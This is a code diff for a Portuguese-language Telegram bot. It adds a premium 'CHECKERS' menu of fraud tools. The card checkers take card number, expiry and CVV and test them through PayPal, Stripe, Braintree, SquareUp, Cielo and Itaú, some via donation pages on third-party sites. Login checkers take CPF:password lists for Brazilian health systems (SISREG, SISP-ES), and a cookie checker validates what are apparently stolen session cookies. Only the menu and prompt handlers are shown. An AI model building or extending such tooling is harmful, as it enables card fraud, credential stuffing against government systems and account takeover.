+      tool_linkscan: { prompt: '🔗 *Link Scanner*\n\nEnvie a URL para analisar:', pending: 'linkscan_check' },
+      tool_revimg: { prompt: '📸 *Reverse Image*\n\nEnvie a URL da imagem:', pending: 'revimg_check' },
+      tool_pixkey: { prompt: '💳 *Pix Key*\n\nEnvie a chave Pix (CPF, CNPJ, email, telefone, aleatória):', pending: 'pixkey_check' },
+      tool_username: { prompt: '👤 *Username Check*\n\nEnvie o username para buscar:', pending: 'username_check' },
+      tool_checkpass: { prompt: '🔐 *Password Check*\n\nEnvie a senha para verificar:', pending: 'checkpass_check' },
+      tool_endereco: { prompt: '🗺️ *Endereço OSINT*\n\nEnvie o CEP ou endereço para buscar:', pending: 'endereco_check' },
+      tool_bincheck: { prompt: '🔢 *BIN Lookup*\n\nEnvie os 6 primeiros dígitos do cartão:', pending: 'bin_check' }
+    };
+    if (toolHandlers[data]) {
+      bot.answerCallbackQuery(callbackQuery.id).catch(() => {});
+      bot.deleteMessage(chatId, msg.message_id).catch(() => {});
+      const h = toolHandlers[data];
+      pendingSearch.set(userKey, h.pending);
+      pendingSearch.set(chatId, h.pending);
+      return bot.sendMessage(chatId, h.prompt,
+        opts({ parse_mode: 'Markdown', reply_markup: { inline_keyboard: [[{ text: '🔴 CANCELAR', callback_data: 'cancel_search', style: 'primary' }]] } })
       );
     }
 
@@ -5175,9 +5678,203 @@ const mainMenuButtons = [
           parse_mode: 'Markdown',
           reply_markup: {
             inline_keyboard: [
-              [{ text: '💉 SIPNI', callback_data: 'sipni_checker', style: 'primary' }],
+              [{ text: '💉 SIPNI', callback_data: 'sipni_checker', style: 'primary' }, { text: '🏥 SISREG', callback_data: 'sisreg_checker', style: 'primary' }],
+              [{ text: '🏛️ SISP-ES', callback_data: 'sisp_checker', style: 'primary' }, { text: '🍪 COOKIE CHECKER', callback_data: 'cookie_checker', style: 'primary' }],
+              [{ text: '💳 Cielo Check', callback_data: 'cielo_checker', style: 'primary' }, { text: '💳 Itaú Check', callback_data: 'itau_checker', style: 'primary' }],
+              [{ text: '💳 PayPal Check', callback_data: 'paypal_checker', style: 'primary' }, { text: '💳 Stripe Check', callback_data: 'stripe_checker', style: 'primary' }],
+              [{ text: '💳 Braintree', callback_data: 'braintree_checker', style: 'primary' }, { text: '🔲 SquareUp', callback_data: 'squareup_checker', style: 'primary' }],
+              [{ text: '💳 Stripe API (SK)', callback_data: 'stripe2_checker', style: 'primary' }, { text: '💳 Stripe Badger', callback_data: 'stripenew_checker', style: 'primary' }],
               [{ text: '🏠 MENU PRINCIPAL', callback_data: 'cmd_menu', style: 'primary' }, { text: '🔴 FECHAR', callback_data: 'cancel_search', style: 'primary' }]
             ]
+          }
+        })
+      );
+    }
+
+    // ── COOKIE CHECKER ──
+    if (data === 'cookie_checker') {
+      bot.answerCallbackQuery(callbackQuery.id).catch(() => {});
+      const access = await checkUserAccess(chatId, cbIsGroup);
+      if (access.status !== 'premium') {
+        return bot.sendMessage(chatId, '⚠️ *CHECKERS* é exclusivo para usuários *Premium*!', opts({ parse_mode: 'Markdown' }));
+      }
+      const userKey = `${chatId}_${msg.from?.id || ''}`;
+      pendingSearch.set(userKey, 'cookie_check');
+      pendingSearch.set(chatId, 'cookie_check');
+      return bot.sendMessage(chatId,
+        `🍪 *COOKIE CHECKER*\n\nEnvie um arquivo *\\.txt* com cookies nos formatos suportados:\n\n• JSON: \`[{"name":"x","value":"y","domain":"z"}]\`\n• Netscape (export do navegador)\n• \`URL | cookie1=val; cookie2=val\`\n\nO bot verificará automaticamente se os cookies são válidos\\.`,
+        opts({
+          parse_mode: 'MarkdownV2',
+          reply_markup: {
+            inline_keyboard: [[{ text: '🔴 CANCELAR', callback_data: 'cancel_search', style: 'primary' }]]
+          }
+        })
+      );
+    }
+
+    // ── CIELO CHECKER ──
+    if (data === 'cielo_checker') {
+      bot.answerCallbackQuery(callbackQuery.id).catch(() => {});
+      const access = await checkUserAccess(chatId, cbIsGroup);
+      if (access.status !== 'premium') {
+        return bot.sendMessage(chatId, '⚠️ *CHECKERS* é exclusivo para usuários *Premium*!', opts({ parse_mode: 'Markdown' }));
+      }
+      const userKey = `${chatId}_${msg.from?.id || ''}`;
+      pendingSearch.set(userKey, 'cielo_check');
+      pendingSearch.set(chatId, 'cielo_check');
+      return bot.sendMessage(chatId,
+        `💳 *CIELO CHECKER*\n\nEnvie o cartão no formato:\n\n\`\`\`\ncard|mês|ano|cvv\n\`\`\`\n\nSeparadores aceitos: \`|\` \`,\` \`:\` \`»\`\n\n_Exemplo: \`4111111111111111|12|26|123\`_`,
+        opts({
+          parse_mode: 'Markdown',
+          reply_markup: {
+            inline_keyboard: [[{ text: '🔴 CANCELAR', callback_data: 'cancel_search', style: 'primary' }]]
+          }
+        })
+      );
+    }
+
+    // ── ITAÚ CHECKER ──
+    if (data === 'itau_checker') {
+      bot.answerCallbackQuery(callbackQuery.id).catch(() => {});
+      const access = await checkUserAccess(chatId, cbIsGroup);
+      if (access.status !== 'premium') {
+        return bot.sendMessage(chatId, '⚠️ *CHECKERS* é exclusivo para usuários *Premium*!', opts({ parse_mode: 'Markdown' }));
+      }
+      const userKey = `${chatId}_${msg.from?.id || ''}`;
+      pendingSearch.set(userKey, 'itau_check');
+      pendingSearch.set(chatId, 'itau_check');
+      return bot.sendMessage(chatId,
+        `💳 *ITAÚ CHECKER*\n\nEnvie o cartão no formato:\n\n\`\`\`\ncard|mês|ano|cvv\n\`\`\`\n\nSeparadores aceitos: \`|\` \`,\` \`:\` \`»\` etc.\n\n_Exemplo: \`4111111111111111|12|26|123\`_`,
+        opts({
+          parse_mode: 'Markdown',
+          reply_markup: {
+            inline_keyboard: [[{ text: '🔴 CANCELAR', callback_data: 'cancel_search', style: 'primary' }]]
+          }
+        })
+      );
+    }
+
+    // ── PAYPAL CHECKER ──
+    if (data === 'paypal_checker') {
+      bot.answerCallbackQuery(callbackQuery.id).catch(() => {});
+      const access = await checkUserAccess(chatId, cbIsGroup);
+      if (access.status !== 'premium') {
+        return bot.sendMessage(chatId, '⚠️ *CHECKERS* é exclusivo para usuários *Premium*!', opts({ parse_mode: 'Markdown' }));
+      }
+      const userKey = `${chatId}_${msg.from?.id || ''}`;
+      pendingSearch.set(userKey, 'paypal_check');
+      pendingSearch.set(chatId, 'paypal_check');
+      return bot.sendMessage(chatId,
+        `💳 *PAYPAL CHECKER*\n\nEnvie o cartão no formato:\n\n\`\`\`\ncard|mês|ano|cvv\n\`\`\`\n\nSeparadores aceitos: \`|\` \`,\` \`:\` \`»\` etc.\n\n_Exemplo: \`4111111111111111|12|26|123\`_\n\n⚙️ Usa doação via PayPal para testar o cartão.`,
+        opts({
+          parse_mode: 'Markdown',
+          reply_markup: {
+            inline_keyboard: [[{ text: '🔴 CANCELAR', callback_data: 'cancel_search', style: 'primary' }]]
+          }
+        })
+      );
+    }
+
+    // ── STRIPE CHECKER ──
+    if (data === 'stripe_checker') {
+      bot.answerCallbackQuery(callbackQuery.id).catch(() => {});
+      const access = await checkUserAccess(chatId, cbIsGroup);
+      if (access.status !== 'premium') {
+        return bot.sendMessage(chatId, '⚠️ *CHECKERS* é exclusivo para usuários *Premium*!', opts({ parse_mode: 'Markdown' }));
+      }
+      const userKey = `${chatId}_${msg.from?.id || ''}`;
+      pendingSearch.set(userKey, 'stripe_check');
+      pendingSearch.set(chatId, 'stripe_check');
+      return bot.sendMessage(chatId,
+        `💳 *STRIPE CHECKER*\n\nEnvie o cartão no formato:\n\n\`\`\`\ncard|mês|ano|cvv\n\`\`\`\n\nSeparadores aceitos: \`|\` \`,\` \`:\` \`»\` etc.\n\n_Exemplo: \`4111111111111111|12|26|123\`_\n\n⚙️ Usa WooCommerce + Stripe para testar o cartão.`,
+        opts({
+          parse_mode: 'Markdown',
+          reply_markup: {
+            inline_keyboard: [[{ text: '🔴 CANCELAR', callback_data: 'cancel_search', style: 'primary' }]]
+          }
+        })
+      );
+    }
+
+    // ── BRAINTREE CHECKER ──
+    if (data === 'braintree_checker') {
+      bot.answerCallbackQuery(callbackQuery.id).catch(() => {});
+      const access = await checkUserAccess(chatId, cbIsGroup);
+      if (access.status !== 'premium') {
+        return bot.sendMessage(chatId, '⚠️ *CHECKERS* é exclusivo para usuários *Premium*!', opts({ parse_mode: 'Markdown' }));
+      }
+      const userKey = `${chatId}_${msg.from?.id || ''}`;
+      pendingSearch.set(userKey, 'braintree_check');
+      pendingSearch.set(chatId, 'braintree_check');
+      return bot.sendMessage(chatId,
+        `💳 *BRAINTREE CHECKER*\n\nEnvie o cartão no formato:\n\n\`\`\`\ncard|mês|ano|cvv\n\`\`\`\n\n_Exemplo: \`4111111111111111|12|26|123\`_`,
+        opts({
+          parse_mode: 'Markdown',
+          reply_markup: {
+            inline_keyboard: [[{ text: '🔴 CANCELAR', callback_data: 'cancel_search', style: 'primary' }]]
+          }
+        })
+      );
+    }
+
+    // ── SQUAREUP CHECKER ──
+    if (data === 'squareup_checker') {
+      bot.answerCallbackQuery(callbackQuery.id).catch(() => {});
+      const access = await checkUserAccess(chatId, cbIsGroup);
+      if (access.status !== 'premium') {
+        return bot.sendMessage(chatId, '⚠️ *CHECKERS* é exclusivo para usuários *Premium*!', opts({ parse_mode: 'Markdown' }));
+      }
+      const userKey = `${chatId}_${msg.from?.id || ''}`;
+      pendingSearch.set(userKey, 'squareup_check');
+      pendingSearch.set(chatId, 'squareup_check');
+      return bot.sendMessage(chatId,
+        `💳 *SQUAREUP CHECKER*\n\nEnvie o cartão no formato:\n\n\`\`\`\ncard|mês|ano|cvv\n\`\`\`\n\nSeparadores aceitos: \`|\` \`,\` \`:\` \`»\` etc.\n\n_Exemplo: \`4111111111111111|12|26|123\`_\n\n⚙️ Usa SquareUp PCI Connect via flooringhut.co.uk.`,
+        opts({
+          parse_mode: 'Markdown',
+          reply_markup: {
+            inline_keyboard: [[{ text: '🔴 CANCELAR', callback_data: 'cancel_search', style: 'primary' }]]
+          }
+        })
+      );
+    }
+
+    // ── STRIPE2 CHECKER (SK) ──
+    if (data === 'stripe2_checker') {
+      bot.answerCallbackQuery(callbackQuery.id).catch(() => {});
+      const access = await checkUserAccess(chatId, cbIsGroup);
+      if (access.status !== 'premium') {
+        return bot.sendMessage(chatId, '⚠️ *CHECKERS* é exclusivo para usuários *Premium*!', opts({ parse_mode: 'Markdown' }));
+      }
+      const userKey = `${chatId}_${msg.from?.id || ''}`;
+      pendingSearch.set(userKey, 'stripe2_check');
+      pendingSearch.set(chatId, 'stripe2_check');
+      return bot.sendMessage(chatId,
+        `💳 *STRIPE API CHECKER (SK)*\n\nEnvie os dados no formato:\n\n\`\`\`\nsec|card|mês|ano|cvv\n\`\`\`\n\nOnde \`sec\` é sua Stripe Secret Key (sk_live_...).\n\n_Exemplo: \`sk_live_xxx|4111111111111111|12|26|123\`_\n\n⚙️ Cria source > customer > charge $0.50 > refund.`,
+        opts({
+          parse_mode: 'Markdown',
+          reply_markup: {
+            inline_keyboard: [[{ text: '🔴 CANCELAR', callback_data: 'cancel_search', style: 'primary' }]]
+          }
+        })
+      );
+    }
+
+    // ── STRIPENEW CHECKER (BadgerHerald) ──
+    if (data === 'stripenew_checker') {
+      bot.answerCallbackQuery(callbackQuery.id).catch(() => {});
+      const access = await checkUserAccess(chatId, cbIsGroup);
+      if (access.status !== 'premium') {
+        return bot.sendMessage(chatId, '⚠️ *CHECKERS* é exclusivo para usuários *Premium*!', opts({ parse_mode: 'Markdown' }));
+      }
+      const userKey = `${chatId}_${msg.from?.id || ''}`;
+      pendingSearch.set(userKey, 'stripenew_check');
+      pendingSearch.set(chatId, 'stripenew_check');
+      return bot.sendMessage(chatId,
+        `💳 *STRIPE BADGER CHECKER*\n\nEnvie o cartão no formato:\n\n\`\`\`\ncard|mês|ano|cvv\n\`\`\`\n\nSeparadores aceitos: \`|\` \`,\` \`:\` \`»\` etc.\n\n_Exemplo: \`4111111111111111|12|26|123\`_\n\n⚙️ Usa Stripe via badgerherald.com donation.`,
+        opts({
+          parse_mode: 'Markdown',
+          reply_markup: {
+            inline_keyboard: [[{ text: '🔴 CANCELAR', callback_data: 'cancel_search', style: 'primary' }]]
           }
         })
       );
@@ -5202,6 +5899,84 @@ const mainMenuButtons = [
           }
         })
       );
+    }
+
+    // ── SISP CANCEL ──
+    if (data === 'cancel_sisp') {
+      bot.answerCallbackQuery(callbackQuery.id, { text: '⏹ Parando...' }).catch(() => {});
+      cancelSispRun(chatId);
+      runningSearches.delete(chatId);
+      return bot.editMessageText('⏹ *SISP-ES CHECKER — Cancelado*', {
+        chat_id: chatId,
+        message_id: msg.message_id,
+        parse_mode: 'Markdown',
+        reply_markup: {
+          inline_keyboard: [
+            [{ text: '📋 CHECKERS', callback_data: 'checkers_menu', style: 'primary' }],
+            [{ text: '🏠 MENU PRINCIPAL', callback_data: 'cmd_menu', style: 'primary' }, { text: '🔴 FECHAR', callback_data: 'cancel_search', style: 'primary' }]
+          ]
+        }
+      }).catch(() => {});
+    }
+
+    // ── SISP-ES CHECKER ──
+    if (data === 'sisp_checker') {
+      bot.answerCallbackQuery(callbackQuery.id).catch(() => {});
+      const access = await checkUserAccess(chatId, cbIsGroup);
+      if (access.status !== 'premium') {
+        return bot.sendMessage(chatId, '⚠️ *CHECKERS* é exclusivo para usuários *Premium*!', opts({ parse_mode: 'Markdown' }));
+      }
+      const userKey = `${chatId}_${msg.from?.id || ''}`;
+      pendingSearch.set(userKey, 'sisp_check');
+      pendingSearch.set(chatId, 'sisp_check');
+      return bot.sendMessage(chatId,
+        `🏛️ *SISP-ES CHECKER*\n\nEnvie um arquivo *\\.txt* com os logins no formato:\n\n\`\`\`\ncpf:senha\ncpf\\|senha\n\`\`\`\n\nO bot verificará automaticamente cada login e retornará o resultado\\.`,
+        opts({
+          parse_mode: 'MarkdownV2',
+          reply_markup: {
+            inline_keyboard: [[{ text: '🔴 CANCELAR', callback_data: 'cancel_search', style: 'primary' }]]
+          }
+        })
+      );
+    }
+
+    // ── SISREG CHECKER ──
+    if (data === 'sisreg_checker') {
+      bot.answerCallbackQuery(callbackQuery.id).catch(() => {});
+      const access = await checkUserAccess(chatId, cbIsGroup);
+      if (access.status !== 'premium') {
+        return bot.sendMessage(chatId, '⚠️ *CHECKERS* é exclusivo para usuários *Premium*!', opts({ parse_mode: 'Markdown' }));
+      }
+      const userKey = `${chatId}_${msg.from?.id || ''}`;
+      pendingSearch.set(userKey, 'sisreg_check');
+      pendingSearch.set(chatId, 'sisreg_check');
+      return bot.sendMessage(chatId,
+        `🏥 *SISREG CHECKER*\n\nEnvie um arquivo *\\.txt* com os logins no formato:\n\n\`\`\`\ncpf:senha\ncpf\\|senha\n\`\`\`\n\nO bot verificará automaticamente cada login e retornará o resultado\\.`,
+        opts({
+          parse_mode: 'MarkdownV2',
+          reply_markup: {
+            inline_keyboard: [[{ text: '🔴 CANCELAR', callback_data: 'cancel_search', style: 'primary' }]]
+          }
+        })
+      );
+    }
+
+    // ── SISREG CANCEL ──
+    if (data === 'cancel_sisreg') {
+      bot.answerCallbackQuery(callbackQuery.id, { text: '⏹ Parando...' }).catch(() => {});
+      cancelSisregRun(chatId);
+      runningSearches.delete(chatId);
+      return bot.editMessageText('⏹ *SISREG CHECKER — Cancelado*', {
+        chat_id: chatId,
+        message_id: msg.message_id,
+        parse_mode: 'Markdown',
+        reply_markup: {
+          inline_keyboard: [
+            [{ text: '📋 CHECKERS', callback_data: 'checkers_menu', style: 'primary' }],
+            [{ text: '🏠 MENU PRINCIPAL', callback_data: 'cmd_menu', style: 'primary' }, { text: '🔴 FECHAR', callback_data: 'cancel_search', style: 'primary' }]
+          ]
+        }
+      }).catch(() => {});
     }
 
     // ── SIPNI CANCEL ──
